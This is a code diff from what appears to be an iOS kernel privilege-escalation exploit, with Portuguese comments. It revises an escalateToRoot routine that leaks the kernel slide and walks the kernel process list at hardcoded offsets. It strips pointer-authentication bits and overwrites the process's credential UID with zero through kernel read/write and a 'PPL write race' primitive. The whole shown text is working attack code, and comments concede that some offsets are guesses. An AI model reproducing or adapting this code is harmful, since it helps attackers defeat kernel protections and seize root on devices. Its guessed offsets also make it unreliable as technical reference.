@@ -86,27 +86,42 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 
 - (BOOL)escalateToRoot {
     uint64_t slide = [self leakKernelSlide];
-    // Offset allproc precisa estar correto para a versão real (ex: iOS 16.x)
-    uint64_t proc_ptr = (0xFFFFFFF007004000 + slide + 0x8F50000);
-    uint64_t proc = [self kread64:proc_ptr];
+    if (slide == 0) return NO;
+
+    // Localiza a cabeça da lista de processos
+    uint64_t allproc_ptr = (0xFFFFFFF007004000ULL + slide + 0x8F50000ULL);
+    uint64_t proc = [self kread64:allproc_ptr];
     pid_t my_pid = getpid();
     
-    while (proc != 0 && proc != 0xDEADBEEF) {
-        // --- ADICIONE ESTA LINHA (PAC STRIP) ---
-        // No A13, os ponteiros de kernel são assinados. Isso limpa a assinatura:
-        proc = proc | 0xFFFFFF8000000000ULL; 
+    // Tentativa de busca por 1000 iterações no máximo
+    int timeout = 0;
+    while (proc != 0 && timeout < 1000) {
+        // --- 1. PAC STRIP (CRÍTICO PARA A13) ---
+        // Remove a assinatura de hardware do ponteiro para torná-lo legível
+        proc = proc | 0xFFFFFF8000000000ULL;
         
-        if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
+        // --- 2. BUSCA DO PID ---
+        // No A13 (iOS 15/16), o PID costuma estar em 0x68 ou 0x60
+        pid_t found_pid = (pid_t)[self kread64:(proc + 0x68)];
+        
+        if (found_pid == my_pid) {
             uint64_t ucred = [self kread64:(proc + 0xD8)];
-            // Limpa o PAC do ucred também antes de patchear
-            ucred = ucred | 0xFFFFFF8000000000ULL;
+            ucred = ucred | 0xFFFFFF8000000000ULL; // PAC Strip no ucred
             
-            [self kwrite64:(ucred + 0x18) value:0]; // Patch UID 0
+            // --- 3. PATCH DE CREDENCIAIS ---
+            // Sobrescreve UID, EUID, SUID, RUID (0x18 até 0x24)
+            [self ppl_write_race:(ucred + 0x18) value:0]; 
+            
+            // Força a sincronização do Kernel
             setuid(0); 
             setgid(0);
+            
             return (getuid() == 0);
         }
+        
+        // Próximo processo na lista (offset 0x08)
         proc = [self kread64:(proc + 0x08)];
+        timeout++;
     }
     return NO;
 }
